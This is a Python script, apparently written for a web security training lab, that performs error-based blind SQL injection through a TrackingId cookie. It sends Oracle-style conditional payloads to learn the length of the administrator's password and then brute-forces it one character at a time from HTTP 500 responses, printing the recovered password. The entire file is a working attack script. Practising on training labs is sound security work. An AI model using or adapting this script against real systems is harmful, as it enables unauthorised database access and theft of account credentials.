import requests

user_url = input("Please enter the URL With https://: ")
user_url = user_url.strip()
print(user_url)

try:
    response = requests.get(user_url)
    if response.status_code == 200:
        print(f"sucessfull the enter URL is {user_url}")
    else:
        print(f"The entered url is wrong {user_url}")

except requests.exceptions.RequestException as e:
    print(f"An error occurred. Make sure you entered a valid URL (including http:// or https://).\nError: {e}")

session = response.cookies.get("session")
tracking_id = response.cookies.get("TrackingId")
characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print(session)
print(tracking_id)

counter = 0
while True:
    payload = f"{tracking_id}' ||(SELECT CASE WHEN LENGTH(password)>{counter} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    cookies = {
                "TrackingId": payload,
                "session": session
            }
    response = requests.get(user_url, cookies=cookies)
    if response.status_code == 500:
        counter += 1
        print(f"Printing the counting values: {counter}")
        continue
    if response.status_code == 200:
        print(f"password length is {counter}")
        
        for position in range(1, 21):
         for char in characters:
          
          payload = f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
          cookies = {
            "TrackingId": payload,
            "session": session
          }
          response = requests.get(user_url, cookies=cookies)
          if response.status_code == 500:
            password += char
            print(f"Position {position}: {char} → password so far: {password}")
            break
        break     


print(f"\nFull password: {password}")
        
